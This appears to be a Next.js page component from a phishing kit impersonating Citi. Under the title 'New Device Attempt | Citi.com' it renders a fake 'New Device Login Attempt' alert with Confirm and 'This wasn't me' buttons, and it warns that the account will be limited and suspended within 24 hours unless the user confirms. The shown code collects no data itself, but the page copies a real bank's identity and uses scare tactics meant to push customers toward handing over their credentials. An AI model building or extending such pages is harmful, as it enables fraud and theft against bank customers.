import Footer from "@/components/layout/Footer";
import Header from "@/components/layout/Header";
import React from "react";

export const metadata = {
  title: "New Device Attempt | Citi.com",
};

const Page = () => {
  return (
    <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8">
          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
            New Device Login Attempt
          </h1>
          <p className="text-sm text-gray-700 mb-6 leading-relaxed">
            We recently noticed a new login to your account from an{" "}
            <span className="font-semibold">Apple iPhone 14 Pro</span>. If this
            was you, please confirm to continue enjoying the benefits of your
            account.
          </p>

          <div className="flex gap-4 mb-6">
            <button className="flex-1 border border-[#0d2d62] text-[#0d2d62] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors">
              This wasn’t me
            </button>
            <button className="flex-1 bg-[#0d2d62] text-white py-3 rounded-lg font-semibold hover:bg-[#08325a] transition-colors">
              Confirm
            </button>
          </div>

          <p className="text-xs text-gray-600 leading-relaxed">
            If you don’t confirm within 24 hours, we’ll limit and suspend your
            account. We apologize for any inconvenience caused by our security
            measures.
          </p>
        </div>
      </div>

      <Footer />
    </main>
  );
};

export default Page;
